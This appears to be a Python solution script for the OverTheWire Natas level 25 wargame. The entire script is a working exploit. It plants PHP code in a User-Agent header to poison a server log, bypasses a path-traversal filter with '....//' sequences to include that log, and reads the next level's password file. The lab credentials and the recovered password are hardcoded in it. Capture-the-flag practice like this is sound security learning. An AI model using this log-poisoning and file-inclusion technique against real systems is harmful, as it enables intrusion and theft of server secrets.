import requests
import re

url1 = 'http://natas25.natas.labs.overthewire.org/?lang=natas_webpass'
auth = requests.auth.HTTPBasicAuth('natas25','GHF6X7YwACaYYssHVY05cFq83hRktl4c')

user_agent = {'User-agent': '<? echo("qnax".file_get_contents("/etc/natas_webpass/natas26")); ?>'}
r1 = requests.get(url1, auth=auth, headers=user_agent)
sid = r1.cookies['PHPSESSID']

url2 = 'http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_'+sid+'.log'
r2 = requests.get(url2, auth=auth)
pwd = re.findall('qnax(.*)', r2.text)[0]

print(pwd) # oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

